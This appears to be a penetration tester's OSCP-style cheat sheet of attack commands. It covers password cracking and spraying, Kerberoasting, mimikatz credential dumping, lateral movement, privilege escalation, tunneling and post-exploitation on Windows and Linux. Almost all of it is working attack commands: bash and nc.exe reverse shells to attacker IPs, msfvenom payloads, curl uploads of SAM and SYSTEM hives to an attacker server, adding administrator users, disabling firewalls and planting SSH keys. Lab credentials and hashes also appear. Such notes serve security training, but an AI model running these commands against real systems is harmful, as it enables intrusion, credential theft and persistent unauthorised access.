```bash
put <file> #to upload file
get <file> #to download file
```
	• Downloading shares is made easy—if the folder consists of several files, they will all be downloaded by this.

```bash
mask ""
recurse ON
prompt OFF
mget *
```

# Credential Attacks
Password-Hash Cracking

Hashcat
#Obtain the Hash module number
```bash
hashcat -m <number> hash wordlists.txt --force
```

Fcrackzip
```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.
#Cracking zip files
```

john
```bash
ssh2john.py id_rsa > hash
#Convert the obtained hash to John format john hashfile --wordlist=rockyou.txt
```

# Password Spray

```bash
crackmapexec smb -u users.txt -p 'pass' -d   --continue-on-success
netexec smb CICADA-DC -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```


# AS-REP Roasting

```bash
impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass
impacket-GetNPUsers -dc-ip <DC-IP>  <domain>/<user>:<pass>  -request                      ##users                                             #this gives us the hash.

impacket-GetNPUsers -dc-ip 192.168.152.162  sub.poseidon.yzx/lisa -hashes ':905ae9b4d957545fb7b9ea0c4333247b'  -request



hashcat -m 18200 hashes.txt wordlist.txt --force
```

# Kerberoasting

```bash
impacket-GetUserSPNs MARVEL.local/fcastle:'Password1' -dc-ip 192.168.137.131 -request                                        #this gives us the hash for service ticket

impacket-GetNPUsers -dc-ip 192.168.152.162 sub.poseidon.yzx/lisa -hashes ':905ae9b4d957545fb7b9ea0c4333247b' -request





hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

https://github.com/ShutdownRepo/targetedKerberoast
Add domain name to hosts file

```bash
python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'

python3 targetedKerberoast.py -v -d 'laser.com' -u 'yulia.weber' -p 'Yulia@Laser777' --dc-ip 192.168.138.172
```

#OneLiner to get hashes and plaintext passwords

```bash
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"   
	
	mimikatz.exe "lsadump::zerologon /target:192.168.217.97 /account:DC01$"
	mimikatz.exe "lsadump::dcsync /domain:secura.yzx /dc:dc01 /user:administrator /authuser:DC01$ /authdomain:main /authpassword:"" /authntlm"


privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::lsa
lsadump::cache
lsadump::secrets
```

Mimikatz.exe
```bash
taskkill /F /IM mimikatz.exe >> if lput didn’t work
```

Golden ticket

Rubeus
```bash
.\Rubeus.exe kerberoast /outfile:hash.kerberoast
```

Password-Hash Cracking
Hash Analyzer: https://www.tunnelsup.com/hash-analyzer/
fcrackzip

```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip                                                                                                                            #Cracking zip files
```

John
	https://github.com/openwall/john/tree/bleeding-jumbo/run
	• If there’s an encrypted file, convert it into john hash and crack.

```bash
ssh2john.py id_rsa > hash
#Convert the obtained hash to John format(above link)
john hashfile --wordlist=rockyou.txt
```

Hashcat
	https://hashcat.net/wiki/doku.php?id=example_hashes

#Obtain the Hash module number 
```bash
hashcat -m <number> hash wordlists.txt --force
```

Dealing with Passwords
	• When there’s a scope for bruteforce or hash-cracking then try the following,
		○ Have a valid username first
		○ Don't forget trying admin:admin
		○ Try username:username as first credential
		○ If it’s related to a service, try default passwords.
		○ The service name is the username, and the same name is used for the password.
		○ Use Rockyou.txt
	• Some default passwords to always try out!

password
password1
Password1
Password@123
password@123
admin
administrator
admin@123

# Lateral Movement
RDP from kali

```bash
xfreerdp /u:uname /p:'pass' /v:IP
```

Authentication and get a Shell

```bash
impacket-psexec o.foller:'EarlyMorningFootball777'@192.168.114.160 

 Psexec.py marvel.local/fcastle:P@ssw0rd1@192.168.57.141
 smbexec.py marvel.local/fcastle:P@ssw0rd1@192.168.57.141                 
 wmiexec.py marvel.local/fcastle:P@ssw0rd1@192.168.57.141
smbclient.py Tiffany.Molina:NewIntelligenceCorpUser9876@10.10.10.248

smbclient -U SVC_TGS%GPPstillStandingStrong2k18 //10.10.10.100/Users

evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i cicada.htb                        >> best one

evil-winrm -u 'Administrator' -H 8da83a3fa618b6e3a00e93f676c92a6e -i dc01.fluffy.htb


impacket-secretsdump ksc:'Y1f683X7r@8'@10.20.240.203 
```

##RCE

```bash
psexec.py test.local/john:password123@10.10.10.1
psexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
wmiexec.py test.local/john:password123@10.10.10.1
wmiexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
smbexec.py test.local/john:password123@10.10.10.1
smbexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
atexec.py test.local/john:password123@10.10.10.1 <command>
atexec.py -hashes lmhash:nthash test.local/john@10.10.10.1 <command>
```

Evil-Winrm

##winrm service discovery
```bash
nmap -p5985,5986 <IP>
```
5985 - plaintext protocol
5986 - encrypted

##Login with password
```bash
evil-winrm -i <IP> -u user -p pass
evil-winrm -i <IP> -u user -p pass -S #if 5986 port is open
```

##Login with Hash
```bash
evil-winrm -i <IP> -u user -H ntlmhash
```

##Login with key
```bash
evil-winrm -i <IP> -c certificate.pem -k priv-key.pem -S #-c for public key and -k for private key
```

##Logs
```bash
evil-winrm -i <IP> -u user -p pass -l
```

##File upload and download
```bash
upload <file>
download <file> <filepath-kali> #not required to provide path all time
```

##Loading files direclty from Kali location
```bash
evil-winrm -i <IP> -u user -p pass -s /opt/privsc/powershell #Location can be different
```
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz

##evil-winrm commands
```bash
menu                                                                # to view commands
```

#There are several commands to run

#This is an example for running a binary

```bash
evil-winrm -i <IP> -u user -p pass -e /opt/privsc
```
Bypass-4MSI
menu
```bash
Invoke-Binary /opt/privsc/winPEASx64.exe
```

Pass the Hash


#If hashes are obtained through some means, then use psexec and smbexec and obtain the shell as a different user.

```bash
pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX238cbe81fe00 //10.129.26.210 cmd.exe
```

# Reverse Shells
Reverse shells

Online - Reverse Shell Generator

```bash
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"

<?pHp exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.16.6/1010 0>&1'"); ?>

$bash -i >& /dev/tcp/10.10.16.6/12345 0>&1
$/bin/bash -c '/bin/sh -i >& /dev/tcp/10.10.14.40/4444 0>&1'
$echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.16.6/12345 0>&1' > fdisk
```


php-reverse-shell/php-reverse-shell.php at master · pentestmonkey/php-reverse-shell

```bash
echo  #!/bin/bash \n bash -i >& /dev/tcp/10.10.16.6/12345 0>&1
```

#We can simply pass a reverse shell to the cmd parameter and obtain reverse-shell

```bash
bash%20-c%20%22bash%20i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444% 200%3E%261%22                                  #en

echo -n "bash -c 'bash -i  >& /dev/tcp/attackerip/9090 0>&1' "    | base64


msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.204 LPORT=4444 -f exe -o shell.exe

msfvenom -p linux/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444  -f elf -o rev.elf
```

Stable shell: 

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'

script /dev/null -c bash
```

```bash
KALI : nc -nlvp 4455
```

# Privilege Escalation – Linux
Looking for files with the SUID bit set

```bash
find / -type f -perm -4000 2>/dev/null
```

```bash
echo "charles ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/charles >/dev/null
```

CRONTAB
```bash
Cd /etc/cron.d
Ls
ls -lah /etc/cron*
```




TAR WILD CARD PRIV ESC / CRON job 
```bash
cd /opt/admin
echo "chmod +s /bin/bash" > shell.sh 
chmod +x shell.sh
touch ./"--checkpoint=1"
touch ./"--checkpoint-action=exec=sh shell.sh"
bash -p
```


tar wild card

Mssql database
Help


1. Echo $PATH
```bash
2. john@oscp:/tmp$ echo -e '#!/bin/bash\necho "root:password123" | /usr/sbin/chpasswd' > /tmp/chpasswd                       
3.  john@oscp:/tmp$ chmod +x /tmp/chpasswd
4. john@oscp:/tmp$ export PATH=/tmp:$PATH
```



-----------------------
```bash
john@oscp:/tmp$ touch chpasswd
john@oscp:/tmp$ echo -e '#!/bin/bash\n <reverseshell>' > chpasswd
john@oscp:/tmp$ chmod +x /tmp/chpasswd
john@oscp:/tmp$ export PATH=/tmp:$PATH
```

Linux Privilege Escalation
	• Privesc through TAR wildcard
TTY Shell


```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
echo 'os.system('/bin/bash')'
/bin/sh -i
/bin/bash -i
perl -e 'exec "/bin/sh";'
```


Basic


```bash
find / -writable -type d 2>/dev/null
dpkg -l                                                                                                                                       #Installed applications on Debian system
cat /etc/fstab                                                                                                                               #Listing mounted drives
lsblk                                                                                                                                    #Listing all available drives
lsmod                                                                                                                                 #Listing loaded drivers
watch -n 1 "ps -aux | grep pass"                                                                                  #Checking processes for credentials
sudo tcpdump -i lo -A | grep "pass"                                                                              #Password sniffing using tcpdump
```

Automated Scripts (privesc )

```bash
linPEAS.sh
LinEnum.sh
linuxprivchecker.py
unix-privesc-check
Mestaploit: multi/recon/local_exploit_suggester
```


Sensitive Information (privesc )

```bash
cat .bashrc
env                                                                                                                                                           #checking environment variables
watch -n 1 "ps -aux | grep pass"                                                                                                   #Harvesting active processes for credentials
```
# Process-related information can also be obtained from PSPY


Sudo/SUID/Capabilities
GTFOBins

```bash
sudo -l
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
```

Cron Jobs

#Detecting Cronjobs
```bash
cat /etc/crontab
crontab -l
pspy                                                                                                                   #handy tool to live monitor stuff happening in Linux
grep "CRON" /var/log/syslog                                                                             #inspecting cron logs
```


NFS

##Mountable shares
```bash
cat /etc/exports #On target
showmount -e <target IP> #On attacker
```

###Check for "no_root_squash" in the output of shares
```bash
mount -o rw <targetIP>:<share-location> <directory path we created>
```

#Now create a binary there
```bash
chmod +x <binary>
```

# Privilege Escalation – Windows
Windows Privilege Escalation
💡 `cd C:\ & findstr /SI /M "OS{" *.xml *.ini *.txt`                                                                             - for finding files which contain OSCP flag..



Check permissions

```bash
icacls "C:\Program Files\file name"
```

```bash
Get-Acl file
```

Winpeas
If winpeas is black and white

```bash
$powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\winPEAS.ps1
```


Printspoofer

```bash
Whoami /priv
.\PrintSpoofer64.exe -i -c cmd.exe
PrintSpoofer64.exe -i -c cmd
```



```bash
.\PrintSpoofer64.exe -c "net user hacker Password123! /add"
.\PrintSpoofer64.exe -c "net localgroup administrators hacker /add"
.\PrintSpoofer64.exe -c "net localgroup 'Remote Desktop Users' hacker /add"      >> RDP access 
.\PrintSpoofer64.exe -c "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
```

Reverse Shell Using nc.exe:


```bash
.\PrintSpoofer64.exe -c "C:\Users\eric.wallows\Documents\nc.exe 192.168.45.157 4444 -e cmd.exe"
```


```bash
Nc -nlvp 4444
```


#SharpEfsPotato
ADD USER WITH ADMIN PRIV:

```bash
./SharpEfsPotato.exe -p "cmd.exe" -a "/c net localgroup administrators eric.wallows /add"                             >> one command to be admin
```


```bash
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
```

If you uploaded nc.exe you can open a reverse  shell
```bash
.\SharpEfsPotato.exe -p C:\temp\nc.exe -a "192.168.45.209 4455 -e cmd.exe"
```

Restart service
```bash
cmd
net stop GPGOrchestrator && net start GPGOrchestrator
powershell
Restart-Service -Name GPGOrchestrator -Force
```

Backup operator group  (whoami /priv)
SeBackupPrivilege             Back up files and directories  Enabled	https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md
SeRestorePrivilege            Restore files and directories  Enabled	Backup Operator Privilege Escalation < BorderGate
SeBackupPrivilege             	Windows Privilege Escalation: SeBackupPrivilege - Hacking Articles   SAM and ntds here

```bash
1. mkdir C:\temp
2. reg save hklm\sam c:\Windows\Tasks\SAM
3. reg save hklm\sam c:\Windows\Tasks\SYSTEM
4. impacket-secretsdump -sam SAM -system SYSTEM LOCAL                                   Secretes Dump for sam and system
```

Windows Privilege Escalation
💡 cd C:\ & findstr /SI /M "OS{" *.xml *.ini *.txt - for finding files which contain OSCP flag..
Manual Enumeration commands


#Groups we're part of
```bash
whoami /groups
whoami /all #lists everything we own.
```

#Starting, Restarting and Stopping services in Powershell
```bash
Start-Service <service>
Stop-Service <service>
Restart-Service <service>
```

#Powershell History
```bash
Get-History
(Get-PSReadlineOption).HistorySavePath #displays the path of consoleHost_history.txt
type C:\Users\sathvik\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

#Viewing installed execuatbles
```bash
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

#Process Information
```bash
Get-Process
Get-Process | Select ProcessName,Path
```

#Sensitive info in XAMPP Directory
```bash
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue #this for a specific user
```

#Service Information
```bash
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

Automated Scripts


```bash
winpeas.exe
winpeas.bat
Jaws-enum.ps1
powerup.ps1
PrivescCheck.ps1
```

Token Impersonation
	• Command to check whoami /priv

#Printspoofer
```bash
PrintSpoofer.exe -i -c powershell.exe 
PrintSpoofer.exe -c "nc.exe <lhost> <lport> -e cmd"
```

#RoguePotato
```bash
RoguePotato.exe -r <AttackerIP> -e "shell.exe" -l 9999
```

#GodPotato
```bash
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "shell.exe"
```

#JuicyPotatoNG
```bash
JuicyPotatoNG.exe -t * -p "shell.exe" -a
```

#SharpEfsPotato
```bash
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
```

If you uploaded nc.exe you can open a reverse  shell
```bash
.\SharpEfsPotato.exe -p C:\users\adrian\documents\nc.exe -a "192.168.45.188 4455 -e cmd.exe"
.\SharpEfsPotato.exe -p C:\temp\nc.exe -a "192.168.45.188 1234 -e cmd.exe"
```

#writes whoami command to w.log file

Services
Binary Hijacking

#Identify service from winpeas

```bash
icalcs "path" #F means full permission, we need to check we have full access on the folder
sc qc <servicename> #find binary path variable
sc config <service> <option>="<value>" #change the path to the reverse shell location
sc start <servicename>
```

Unquoted Service Path

```bash
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """  #Displays services which has missing quotes, this can slo be obtained by running WinPEAS
```

#Check the Writable path
```bash
icalcs "path"
```

#Insert the payload in writable location and which works.
```bash
sc start <servicename>
```

Insecure Service Executables

#In Winpeas look for a service which has the following
File Permissions: Everyone [AllAccess]
#Replace the executable in the service folder and start the service
```bash
sc start <service>
```
Weak Registry permissions

#Look for the following in Winpeas services info output
HKLM\system\currentcontrolset\services\<service> (Interactive [FullControl]) #This means we have full access
```bash
accesschk /acceptula -uvwqk <path of registry> #Check for KEY_ALL_ACCESS
```
#Service Information from regedit, identify the variable that holds the executable
```bash
reg query <reg-path>
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```
#Imagepath is the variable here
```bash
net start <service>
```


DLL Hijacking
	1. Find Missing DLLs using Process Monitor, Identify a specific service that looks suspicious, and add a filter.
	2. Check whether you have write permissions in the directory associated with the service.

# Create a reverse-shell
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attaker-IP> LPORT=<listening-port> -f dll > filename.dll
```
	3. Copy it to the victim machine and then move it to the service-associated directory.(Make sure the dll name is similar to the missing name)
	4. Start the listener and restart the service; you'll get a shell.


Autorun

#For checking, it will display some information with file-location
```bash
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

#Check the location is writable
```bash
accesschk.exe \accepteula -wvu "<path>" #returns FILE_ALL_ACCESS
```
#Replace the executable with the reverseshell and we need to wait till Admin logins, then we'll have shell

AlwaysInstallElevated

#For checking, it should return 1 or Ox1
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
#Creating a reverseshell in msi format
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> --platform windows -f msi > reverse.msi
```
#Execute and get shell
```bash
msiexec /quiet /qn /i reverse.msi
```


Schedules Tasks

```bash
schtasks /query /fo LIST /v #Displays list of scheduled tasks, Pickup any interesting one
```
#Permission check - Writable means exploitable!
```bash
icalcs "path"
```
#Wait till the scheduled task in executed, then we'll get a shell

Startup Apps

```bash
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp #Startup applications can be found here
```
#Check writable permissions and transfer
#The only catch here is the system needs to be restarted


Insecure GUI apps

#Check the applications that are running from "TaskManager" and obtain list of applications that are running as Privileged user
#Open that particular application, using "open" feature enter the following
```bash
file://c:/windows/system32/cmd.exe 
```

RunAs - Savedcreds


```bash
cmdkey /list #Displays stored credentials looks for any optential users
```
#Transfer the reverseshell
```bash
runas /savecred /user:admin C:\Temp\reverse.exe
```

# Tunneling & Pivoting
Tunneling 
Setup
```bash
Nano /etc/proxychains4.conf
```
#socks4         127.0.0.1 9050
socks5          127.0.0.1 1080

On kali
```bash
chisel server -p 9001 --reverse
age
```
On victim
```bash
upload chisel.exe
./chisel.exe client 192.168.45.181:9001 R:socks
```


While tunneling 
```bash
$sudo proxychains crackmapexec smb ip.txt -u username.txt -p 'Mushroom!' --continue-on-success
$sudo proxychains crackmapexec winrm ip.txt -u username.txt -H hash   --continue-on-success
$sudo proxychains crackmapexec smb ip.txt -u yoshi -p 'Mushroom!'   
$sudo proxychains crackmapexec winrm ip.txt -u yoshi -p 'Mushroom!'
$sudo proxychains evil-winrm -i 172.16.162.12 -u yoshi -p 'Mushroom!'
$sudo proxychains nxc rdp ip.txt -u yoshi -p 'Mushroom!'  
$sudo proxychains nxc rdp 172.16.162.82 -u yoshi -p Mushroom!    
$sudo proxychains xfreerdp3 /v:172.16.162.12 /u:yoshi /p:Mushroom!


$sudo proxychains nxc rdp ip.txt -u yoshi -p 'Mushroom!' --continue-on-success
$sudo proxychains netexec rdp ip.txt -u yoshi -p 'Mushroom!' --continue-on-success


$sudo proxychains impacket-psexec 'celia.almeda:7k8XHk3dMtmpnC7'@10.10.195.140 
```



Tunneling  Ligolo:

```bash
sudo ip tuntap add user $USER mode tun ligolo	Create interface
sudo ip link set dev ligolo up	Start interface
sudo ip route add 10.10.150.0/24 dev ligolo 	Add route to internal machines
```

Kali : 




Step1: ```bash
$ligolo-proxy -selfcert
```

Step3: ```bash
$sudo ip route add 10.10.102.0/24 dev ligolo                            >> to add the routing tables of the internal network to ligolo interface
```
Step4```bash
$ip route list                                                                                     >> to confirm that it is added
```

Step13: ```bash
$python -m http.server 80
```




Liogolo-ng:
Step5: ```bash
$session
```
Step6: ```bash
$1
```
Step7: ```bash
$start
```
Step8: ```bash
$listener_list
```
Step9: ```bash
$listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444             >>> any connection coming to the first ip on port 1234 forward it to my kali host on port :4444
```
Step10: ```bash
$listener_list
```

Step12 (FILE Transfer): ```bash
$listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80     >>>  80 isnt random it is going to be the same as our python server
```


 (GET File)

KAlI: 

Uploadserver 4445

Ligolo:
```bash
listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:4445 --tcp
```

MS02:

```bash
PS C:\windows.old\Windows> curl.exe -X POST http://10.10.135.147:8888/upload -F "files=@C:\windows.old\windows\system32\SAM"
PS C:\windows.old\Windows> curl.exe -X POST http://10.10.135.147:8888/upload -F "files=@C:\windows.old\windows\system32\SYSTEM"
```



```bash
agent.exe -connect <kali IP>:11601 -ignore-cert
```




Windows MS01:
Transfer the agent file on the victim machine
STEP2:```bash
$ligolo-agent.exe -connect <kali IP : ligolo port > -ignore-cert
```


Windows MS02:
Lets say you are have a Command Execution and you want the reverse shell here:

Use ur reverse shell to be sent to MS01 internal IP and port 1234
Now we get our reverse shell on our kali on port 4444

Step11: ```bash
$Example : nc.exe 10.10.12.131 1234 -e cmd   >> the ip is MS01 the ports is 1234 from the listener 
```


Step14:```bash
$ curl -O http:// <MS01 internal ip>: 12345/winpeas.exe                  ||  $certutil -urlcache -f http:// <MS01 internal ip>: 12345/winpeas.exe  winpeas.exe   
```


```bash
iwr -uri 192.168.45.197:1234/PrintSpoofer64.exe -Outfile PS.exe
```





-------------------------------------------------------------------------------


Uploadserver

Kali:
Uploadserver 5555 

Windows MS02
```bash
curl.exe -X POST http://10.10.196.147:8883/upload -F "files=@C:\windows.old\windows\system32\SAM"     >> MS01 internal ip and his port also
```






-------------------------------------------------------------------------------

On kali

```bash
ligolo-proxy -selfcert                               >>>>> open lingolo 

listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
```

On middle machine ( victim )

```bash
.\agent.exe -connect 192.168.45.161:11601 -ignore-cert
```

Pivoting through SSH

```bash
ssh adminuser@10.10.155.5 -i id_rsa -D 9050                                                                                          #TOR port
```

#Change the info in /etc/proxychains4.conf also enable "Quiet Mode"

```bash
proxychains4 crackmapexec smb 10.10.10.0/24                                               #Example
```

Ligolo-ng

#Creating interface and starting it.
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

#Kali machine - Attacker machine

```bash
./proxy -laddr 0.0.0.0:9001 -selfcert
```

#windows or linux machine - compromised machine

```bash
agent.exe -connect <LHOST>:9001 -ignore-cert
```

#In Ligolo-ng console

```bash
session                                                        #select host
ifconfig                                                       #Notedown the internal network's subnet
start                                                            #after adding relevent subnet to ligolo interface
```

#Adding subnet to ligolo interface - Kali linux

```bash
sudo ip r add <subnet> dev ligolo
```

# File Transfer
Upload nc.exe

```bash
 nc.exe 10.10.12.131 1234 -e cmd
```

File Transfer
SMB server

```bash
impacket-smbserver share . -smb2support
```

Upload from victim:

```bash
copy file.txt \\<YOUR_IP>\share\


impacket-smbserver -smb2support test . -port 445 -username aa -password aa
```

On victim
```bash
net use \\192.168.45.204\test /u:aa aa  
copy Database.kdbx \\192.168.45.204\test
```

Python server
```bash
python -m http.server 8001
```

On window 

```bash
curl -O http:// <MS01 internal ip>: 12345/winpeas.exe 

certutil -urlcache -f http:// 192.168.50.100: 12345/winpeas.exe  winpeas.exe   

iwr -uri 192.168.45.197:1234/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
```

File Transfers
	• Netcat

#Attacker
```bash
nc <target_ip> 1234                          < nmap
```

#Target
```bash
nc -lvp 1234 > nmap
```

	• Downloading on Windows

```bash
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
iwr -uri http://lhost/file -Outfile file
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
copy \\kali\share\file .
```

	• Downloading on Linux

```bash
wget http://lhost/file
curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
```

Windows to Kali

kali> ```bash
impacket-smbserver -smb2support <sharename> .
```
win> ```bash
copy file \\KaliIP\sharename
```

# MSSQL
mssql
```bash
nxc mssql <ip> -u <user> -p <pass> --no-pass
impacket-mssqlclient -port 1433 'user:pass'@$ip
impacket-mssqlclient -windows-auth domain/username:password@10.10.10.29
SQL> xp_cmdshell "whoami"
```

Excute command

```bash
mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@192.168.122.146 -windows-auth
SQL > xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://192.168.45.241/nc.exe -outfile nc.exe"
SQL > xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe 192.168.45.241 4444"
```

# Post-Exploitation
CMD history

```bash
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

cat /home/user/.bash_history
```

Processes
	• Processes, opened ports, and the users associated with it.

```bash
netstat -ano
	• Get-Process
	• ps aux
	• ps -ef
```


Network
	• To find internal network for pivoting

```bash
ip a
ip route
ipconfig /all
route print
arp -a
cat /etc/hosts
cat /etc/resolv.conf
nmcli dev show
```

File discovery 
	• Search for juicy files like id_rsa, password.txt, config files, db files…etc

```bash
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue 

Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

```bash
find / -name id_rsa 2> /dev/null
find / -name *flag* 2> /dev/null
find / -name *.kdbx 2> /dev/null
```


```bash
strings admintool.exe
```

Post Exploitation

WinPEAS

```bash
winpeas.exe > output.txt
```
#Wait for the execution to compelte and search for output.txt

Searching for passwords in registry

```bash
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```
#Always check for "Winlogon" in the output

turn off firewall

```bash
NetSh Advfirewall set allprofiles state off
```


Adding SSH Public key

#Attacker
```bash
ssh-keygen
```

#Target
#Linux
```bash
/root/.ssh/authorized_keys #paste the public key
```
#Windows
```bash
C:\Users\administrator\.ssh\authorized_keys #paste the public key
```

#Login from attacker
```bash
ssh -i id_rsa user@ip
```

Adding Users

#Windows
```bash
net user <username> <password> /add
net localgroup administrators <username> /add
```

#Linxu
```bash
echo "user:pass" | chpasswd -m >> /etc/passwd #Using compromised root
```
#Or change root password
```bash
passwd
```

Mimikatz

```bash
privilege::debug
token::elevate
lsadump::sam
lsadump::secrets
lsadump::cache
sekurlsa::logonpasswords
```

SAM and SYSTEM

```bash
reg save hklm\sam c:\Windows\Tasks\SAM
reg save hklm\system c:\Windows\Tasks\SYSTEM
```

#Using netexec

```bash
nxc smb <IP> -u 'user' -p 'pass' --sam
```

#Using samdump2 (If we have sam and system files)

```bash
samdump2 SYSTEM SAM
```

Passwords

#Files
```bash
find / -name password* 2> /dev/null
find / -name shadow 2> /dev/null #if we have read access, we can crack the hash
```

#Registry
```bash
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

#Config files
```bash
cat /var/www/html/config.php
type C:\xampp\htdocs\config.php
```



KDBX files
Keepass2john

```bash
keepass2john Database.kdbx > hash
john --wordlist=rockyou.txt hash
```
#Use "KeePassXC" tool to open the database file using the obtained password

Dumping Hashes

```bash
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam -system system LOCAL
```

# Misc / Cheats

```bash
echo "10.10.11.23  mailing.htb" >> /etc/hosts
```

Find Exploit

```bash
searchsploit <name> <version>
searchsploit -m <id>
```

Virtual env

  env
```bash
  source env/bin/activate
```
  
  OR 
  
  ```bash
  source venv/bin/activate
```


shutdown
```bash
cmd.exe /c "shutdown /r /t 0"
```



